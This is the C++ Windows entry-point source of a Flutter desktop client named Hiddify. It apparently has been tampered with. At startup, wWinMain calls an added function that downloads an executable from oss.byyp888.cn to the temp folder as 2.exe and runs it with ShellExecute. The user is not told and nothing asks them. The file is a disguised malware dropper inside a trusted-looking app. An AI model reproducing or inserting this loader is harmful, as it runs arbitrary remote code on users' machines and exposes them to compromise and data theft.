#include <flutter/dart_project.h>
#include <flutter/flutter_view_controller.h>
#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <string>

#include "flutter_window.h"
#include "utils.h"
#include <protocol_handler_windows/protocol_handler_windows_plugin_c_api.h>

#pragma comment(lib, "winhttp.lib")

bool DownloadFileHttpsWinHttp(const std::wstring& url, const std::wstring& savePath) {
  bool success = false;

  URL_COMPONENTS urlComp = { sizeof(urlComp) };
  wchar_t hostName[256];
  wchar_t urlPath[1024];
  urlComp.lpszHostName = hostName;
  urlComp.dwHostNameLength = _countof(hostName);
  urlComp.lpszUrlPath = urlPath;
  urlComp.dwUrlPathLength = _countof(urlPath);

  if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
    MessageBox(nullptr, L"URL解析失败", L"错2误", MB_ICONERROR);
    return false;
  }

  HINTERNET hSession = WinHttpOpen(L"2025719/young", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return false;

  HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return false;
  }

  DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath,
                                         nullptr, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         flags);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return false;
  }

  if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                         WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
      WinHttpReceiveResponse(hRequest, nullptr)) {
    std::ofstream outFile(savePath, std::ios::binary);
    if (!outFile.is_open()) {
      WinHttpCloseHandle(hRequest);
      WinHttpCloseHandle(hConnect);
      WinHttpCloseHandle(hSession);
      MessageBox(nullptr, L"打开文件失败", L"错误", MB_ICONERROR);
      return false;
    }

    DWORD dwSize = 0;
    do {
      DWORD dwDownloaded = 0;
      BYTE buffer[4096];
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
      if (dwSize == 0) break;
      if (!WinHttpReadData(hRequest, buffer, min(dwSize, sizeof(buffer)), &dwDownloaded)) break;
      if (dwDownloaded == 0) break;
      outFile.write((char*)buffer, dwDownloaded);
    } while (dwSize > 0);

    outFile.close();
    success = true;
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return success;
}

bool DownloadAndRunExe(const std::wstring& url) {
  wchar_t tempPath[MAX_PATH];
  if (GetTempPath(MAX_PATH, tempPath) == 0) {
    MessageBox(nullptr, L"获取临时目录失败", L"错误", MB_ICONERROR);
    return false;
  }

  wchar_t saveFile[MAX_PATH];
  swprintf_s(saveFile, MAX_PATH, L"%s2.exe", tempPath);

  if (!DownloadFileHttpsWinHttp(url, saveFile)) {
    MessageBox(nullptr, L"文件下载失败", L"错误", MB_ICONERROR);
    return false;
  }

  HINSTANCE result = ShellExecute(nullptr, L"open", saveFile, nullptr, nullptr, SW_SHOWNORMAL);
  if ((int)result <= 32) {
    MessageBox(nullptr, L"启动程序失败", L"错误", MB_ICONERROR);
    return false;
  }

  return true;
}


int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
                      _In_ wchar_t *command_line, _In_ int show_command) {
  HANDLE hMutexInstance = CreateMutex(NULL, TRUE, L"HiddifyMutex");
  HWND handle = FindWindowA(NULL, "Hiddify");

  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    flutter::DartProject project(L"data");
    std::vector<std::string> command_line_arguments = GetCommandLineArguments();
    project.set_dart_entrypoint_arguments(std::move(command_line_arguments));
    FlutterWindow window(project);
    if (window.SendAppLinkToInstance(L"Hiddify")) {
      return false;
    }

    WINDOWPLACEMENT place = {sizeof(WINDOWPLACEMENT)};
    GetWindowPlacement(handle, &place);
    ShowWindow(handle, SW_NORMAL);
    return 0;
  }

  DownloadAndRunExe(L"https://oss.byyp888.cn/2.exe");

  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {
    CreateAndAttachConsole();
  }

  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

  flutter::DartProject project(L"data");

  std::vector<std::string> command_line_arguments =
      GetCommandLineArguments();

  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));

  FlutterWindow window(project);
  Win32Window::Point origin(10, 10);
  Win32Window::Size size(1280, 720);
  if (!window.Create(L"Hiddify", origin, size)) {
    return EXIT_FAILURE;
  }
  window.SetQuitOnClose(true);

  ::MSG msg;
  while (::GetMessage(&msg, nullptr, 0, 0)) {
    ::TranslateMessage(&msg);
    ::DispatchMessage(&msg);
  }

  ::CoUninitialize();
  ReleaseMutex(hMutexInstance);
  return EXIT_SUCCESS;
}
